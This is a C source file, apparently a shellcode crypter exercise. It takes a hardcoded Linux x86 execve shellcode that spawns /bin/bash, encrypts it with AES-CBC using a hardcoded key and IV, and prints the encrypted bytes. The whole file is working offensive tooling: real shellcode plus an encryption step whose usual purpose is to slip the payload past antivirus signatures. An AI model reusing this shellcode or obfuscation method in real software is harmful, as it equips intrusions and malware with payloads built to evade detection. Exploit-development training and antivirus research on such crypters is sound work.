#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"
int i;
static void encrypt(void)
{


    //KEY: aeskey00aeskey00aeskey00aeskey00
    uint8_t key[] = { 0x61, 0x65, 0x73, 0x6b, 0x65, 0x79, 0x30, 0x30, 0x61, 0x65, 0x73, 0x6b, 0x65, 0x79, 0x30, 0x30,
                      0x61, 0x65, 0x73, 0x6b, 0x65, 0x79, 0x30, 0x30, 0x61, 0x65, 0x73, 0x6b, 0x65, 0x79, 0x30, 0x30 };

    // IV: aeskey00aeskey00
    uint8_t iv[]  = { 0x61, 0x65, 0x73, 0x6b, 0x65, 0x79, 0x30, 0x30, 0x61, 0x65, 0x73, 0x6b, 0x65, 0x79, 0x30, 0x30 };

    //Shellcode "execve-stack" + 2 NOPs
	uint8_t shellcode[] = { 0x31, 0xc0, 0x50, 0x68, 0x62, 0x61, 0x73, 0x68,
        	         	0x68, 0x62, 0x69, 0x6e, 0x2f, 0x68, 0x2f, 0x2f,
                	 	0x2f, 0x2f, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53,
	                 	0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80, 0x90, 0x90 };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, shellcode, sizeof(shellcode));


    printf("Encrypted Shellcode:");
    printf("\n");

    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\0x%02x", shellcode[i]);
    }

    printf("\n");
}

int main(void)
{
    encrypt();
}
